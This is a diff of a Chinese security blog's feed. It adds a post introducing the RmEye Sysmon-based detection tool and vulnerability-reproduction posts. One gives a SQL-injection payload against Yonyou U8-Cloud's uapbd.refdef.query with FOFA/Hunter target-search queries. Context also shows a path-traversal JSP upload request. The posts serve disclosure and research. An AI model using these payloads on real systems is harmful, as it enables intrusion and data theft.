@@ -3,7 +3,79 @@
     <id>http://example.com</id>
     <title>余香</title>
     <link href="http://example.com" />
-    <updated>2024-11-05T08:02:29.000Z</updated>
+    <updated>2024-11-05T11:32:55.000Z</updated>
+    <category term="漏洞复现" />
+    <category term="神兵利器" />
+    <entry>
+        <id>http://example.com/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/</id>
+        <title>RmEye-戎码之眼</title>
+        <link rel="alternate" href="http://example.com/2024/11/05/RmEye-%E6%88%8E%E7%A0%81%E4%B9%8B%E7%9C%BC/"/>
+        <content type="html">&lt;h1 id=&#34;rmeye&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rmeye&#34;&gt;#&lt;/a&gt; RmEye&lt;/h1&gt;
+&lt;p&gt;RmEye 是一个 window 上的基于 att&amp;amp;ck 现代 EDR 设计思想的威胁响应工具。不同于 EDR, 它轻量、高效。自身定位是轻量级威胁检出工具。而不是繁重的、需要付费的、效果不明的所谓的 EDR&lt;/p&gt;
+&lt;h2 id=&#34;功能特点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#功能特点&#34;&gt;#&lt;/a&gt; 功能特点&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;基于 att&amp;amp;ck 设计。所有设计只是为了符合 att&amp;amp;ck 的攻击路径、攻击链 (虽然规则里面没有标注 T 因为懒惰)&lt;/li&gt;
+&lt;li&gt;轻量、高效。为了不适用繁重超占内存的 ELK 设计思路，而且要保证检出的同时保证不会太重，agent 端使用了大量规则过滤，这样才使得后端使用 sqlite 作为数据库成为可能。单机日志平均一天 4M. 此外轻量级别的客户端一天只占 40-400KB 的内存.&lt;/li&gt;
+&lt;li&gt;行为检出，让免杀成为过去式。基于 att&amp;amp;ck 设计，只看行为不看文件。文件类免杀已经成为过去式.&lt;/li&gt;
+&lt;li&gt;高扩展性。可随需求定制功能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;rmeye-之所以不是-edrxdrmdrndrxxxxxdr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rmeye-之所以不是-edrxdrmdrndrxxxxxdr&#34;&gt;#&lt;/a&gt; RmEye 之所以不是 Edr/Xdr/Mdr/Ndr/XXXXXdr&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;RmEye 没有流量监控&lt;/li&gt;
+&lt;li&gt;RmEye 仅覆盖 20% 左右的 datasource&lt;/li&gt;
+&lt;li&gt;RmEye 没有联动 WAF、IPS/IDS&lt;/li&gt;
+&lt;li&gt;RmEye 没有实时拦截功能&lt;/li&gt;
+&lt;li&gt;对 RPC、COM、ALPC 基本无能为力&lt;/li&gt;
+&lt;li&gt;不支持更高级的扩展检测，如检测脚本、下发规则，主机链&lt;/li&gt;
+&lt;li&gt;受限于 Sysmon, 很多 att&amp;amp;ck 的 T 没有覆盖，也无法覆盖.&lt;/li&gt;
+&lt;li&gt;没有响应能力，只能被动记录。请牢记，RmEye 自身定位是轻量级威胁检出工具&lt;/li&gt;
+&lt;li&gt;github 链接：&lt;a href=&#34;https://github.com/RoomaSec/RmEye&#34;&gt;https://github.com/RoomaSec/RmEye&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安装&#34;&gt;#&lt;/a&gt; 安装&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;运行客户端&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194255.png&#34; alt=&#34;20241105194255&#34;&gt;&lt;br&gt;
+ 下载 release ( &lt;a href=&#34;https://github.com/RoomaSec/RmEye/releases&#34;&gt;https://github.com/RoomaSec/RmEye/releases&lt;/a&gt; ), 里面有客户端，服务端自行 clone 本项目&lt;br&gt;
+服务端是 python3 编写，安装完依赖库后输入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python webserver.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;即可部署&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194408.png&#34; alt=&#34;20241105194408&#34;&gt;&lt;br&gt;
+ 服务端部署后，修改 config.py 里面的&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 检出阈值,越高越难检出但是也会越准确  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAX_THREAT_SCORE = 170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 授权访问主站的IP列表.如果不在后台里面则不能访问后台  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ALLOW_ACCESS_IP = [&amp;#x27;127.0.0.1&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;MAX_THREAT_SCORE 代表报警分数，意思为进程链总分超过此分数则报警，越高越准但是也会漏报 ALLOW_ACCESS_IP 代表允许的 IP, 只有在此名单里面的 IP 才能访问后台。请增加自己的 IP 地址&lt;br&gt;
+客户端则编辑 config.ini&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[communication]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server = http://192.168.111.189:5000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;其中 server 改成你的服务端的地址&lt;br&gt;
+然后分发三个文件给客户端并且放在同一目录:&lt;br&gt;
+config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe&lt;br&gt;
+ 之后管理员身份运行 install.cmd 安装 sysmon 与 RmEye&lt;br&gt;
+ 访问 &lt;a href=&#34;http://xn--ip-fr5c86lx7z:5000&#34;&gt;http:// 服务器 ip:5000&lt;/a&gt; (flask 默认端口) 查看后台&lt;br&gt;
+当然一开始啥数据也没有，为了确认是否安装成功可以将 webserver.py 中的&lt;/p&gt;
+&lt;h2 id=&#34;检出截图&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检出截图&#34;&gt;#&lt;/a&gt; 检出截图&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194549.png&#34; alt=&#34;20241105194549&#34;&gt;&lt;br&gt;
+ 威胁列表&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194613.png&#34; alt=&#34;20241105194613&#34;&gt;&lt;br&gt;
+ 详细进程&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105194641.png&#34; alt=&#34;20241105194641&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;卸载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#卸载&#34;&gt;#&lt;/a&gt; 卸载&lt;/h2&gt;
+&lt;p&gt;卸载 RmEye: 在 RmEye 目录下执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SysEye /uninstall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果您需要卸载 sysmon 执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sysmon /uninstall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;即可干净卫生的卸载掉 RmEye&lt;/p&gt;
+&lt;h2 id=&#34;ioc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ioc&#34;&gt;#&lt;/a&gt; IOC&lt;/h2&gt;
+&lt;p&gt;目前 RmEye 使用的是&lt;a href=&#34;https://metadefender.opswat.com/%E7%9A%84%E5%85%8D%E8%B4%B9IOC,%E7%9B%AE%E5%89%8D%E7%9A%84apikey%E4%BB%85%E7%94%A8%E4%BA%8E%E6%B5%8B%E8%AF%95,%E8%87%AA%E5%B7%B1%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E8%AF%B7%E5%8A%A1%E5%BF%85%E6%89%93%E5%BC%80plugins/ioc_opswat/opswat.py%E6%8A%8A%22apikey%22:&#34;&gt; https://metadefender.opswat.com/ 的免费 IOC, 目前的 apikey 仅用于测试，自己部署的时候请务必打开 plugins/ioc_opswat/opswat.py 把 &amp;quot;apikey&amp;quot;:&lt;/a&gt; &amp;quot;010d4868aef799750e2828fdf17a4d98&amp;quot; 换成你自己的，否做会不安全 (比如其他人能查得到你的请求记录)/ 有使用量限制 (100 次一天). 所以务必换成你自己注册的账号。这个 IOC 源是免费的而且好用的，比 OTX 好用&lt;/p&gt;
+&lt;h2 id=&#34;第三方引用库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三方引用库&#34;&gt;#&lt;/a&gt; 第三方引用库&lt;/h2&gt;
+&lt;p&gt;1、sysmon &lt;a href=&#34;https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon&#34;&gt;https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon&lt;/a&gt;&lt;br&gt;
+2、rule_engine &lt;a href=&#34;https://github.com/zeroSteiner/rule-engine&#34;&gt;https://github.com/zeroSteiner/rule-engine&lt;/a&gt;&lt;br&gt;
+3、yara &lt;a href=&#34;https://github.com/VirusTotal/yara&#34;&gt;https://github.com/VirusTotal/yara&lt;/a&gt;&lt;br&gt;
+4、sysmon-config (客户端使用的默认的规则，但是我做了一些修改) &lt;a href=&#34;https://github.com/SwiftOnSecurity/sysmon-config&#34;&gt;https://github.com/SwiftOnSecurity/sysmon-config&lt;/a&gt;&lt;br&gt;
+ 请遵守相关库的开源协议。相关法律风险本项目不负任何责任&lt;/p&gt;
+</content>
+        <category term="神兵利器" />
+        <updated>2024-11-05T11:32:55.000Z</updated>
+    </entry>
     <entry>
         <id>http://example.com/2024/11/05/%E6%99%BA%E6%85%A7%E5%B9%B3%E5%8F%B0SExcelExpErr.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
         <title>智慧平台SExcelExpErr.ashx存在SQL注入漏洞</title>
@@ -19,6 +91,7 @@
 &lt;h2 id=&#34;验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105160450.png&#34; alt=&#34;20241105160450&#34;&gt;&lt;/p&gt;
 </content>
+        <category term="漏洞复现" />
         <updated>2024-11-05T08:02:29.000Z</updated>
     </entry>
     <entry>
@@ -53,6 +126,19 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /portal/pt/file/upload?pageId=login&amp;amp;filemanager=nc.uap.lfw.file.FileManager&amp;amp;iscover=true&amp;amp;billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--d0b7a0d40eed0e32904c8017b09eb305&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;we.jsp&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%out.print(&amp;quot;hello world&amp;quot;);%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--d0b7a0d40eed0e32904c8017b09eb305--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;h2 id=&#34;验证-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证-3&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105154248.png&#34; alt=&#34;20241105154248&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;用友u8-cloud系统接口uapbdrefdefquery存在sql注入漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用友u8-cloud系统接口uapbdrefdefquery存在sql注入漏洞&#34;&gt;#&lt;/a&gt; 用友 U8-Cloud 系统接口 uapbd.refdef.query 存在 SQL 注入漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;介绍-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍-3&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;用友 U8-Cloud 系统接口 uapbd.refdef.query 存在 SQL 注入漏洞，允许攻击者通过恶意构造的 SQL 语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。&lt;/p&gt;
+&lt;h2 id=&#34;fofa语句-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fofa语句-4&#34;&gt;#&lt;/a&gt; fofa 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;title==&amp;quot;U8C&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;hunter语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hunter语句&#34;&gt;#&lt;/a&gt; hunter 语句&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;app.name=&amp;quot;用友 U8 Cloud&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;poc-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#poc-4&#34;&gt;#&lt;/a&gt; POC&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&amp;amp;isEncrypt=N HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;refName&amp;quot;:&amp;quot;1%&amp;#x27; UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- &amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;验证-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#验证-4&#34;&gt;#&lt;/a&gt; 验证&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241105154622.png&#34; alt=&#34;20241105154622&#34;&gt;&lt;/p&gt;
 </content>
         <updated>2024-11-01T06:49:55.000Z</updated>
     </entry>
@@ -70,6 +156,7 @@
 &lt;h2 id=&#34;漏洞来源&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞来源&#34;&gt;#&lt;/a&gt; 漏洞来源&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw&#34;&gt;https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw&lt;/a&gt;&lt;/p&gt;
 </content>
+        <category term="漏洞复现" />
         <updated>2024-10-31T06:16:22.000Z</updated>
     </entry>
     <entry>
@@ -86,6 +173,7 @@
 &lt;h2 id=&#34;4-验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-验证&#34;&gt;#&lt;/a&gt; 4、验证&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 </content>
+        <category term="漏洞复现" />
         <updated>2024-10-28T08:33:09.466Z</updated>
     </entry>
     <entry>
@@ -136,6 +224,7 @@
 &lt;p&gt;官⽅的修复似乎是把这个⽅法删除掉了？草没看明⽩…&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/huggingface/transformers/commit/693667b8ac8138b83f8adb6522ddaf42fa07c125&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 </content>
+        <category term="漏洞复现" />
         <updated>2024-10-28T02:24:04.261Z</updated>
     </entry>
     <entry>
@@ -336,6 +425,7 @@
 &lt;p&gt;&lt;a href=&#34;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&#34;&gt;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&lt;/a&gt;&lt;/p&gt;
 &lt;h3 id=&#34;文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;#&lt;/a&gt; 文章转自启明星辰 [ADLab]：&lt;a href=&#34;https://mp.weixin.qq.com/s/IVgEogcJigvPCq5MI9eeyg&#34;&gt;VMware ESXi CVE-2024-37085 漏洞验证分析 (qq.com)&lt;/a&gt;&lt;/h3&gt;
 </content>
+        <category term="漏洞复现" />
         <updated>2024-10-28T01:18:34.480Z</updated>
     </entry>
 </feed>
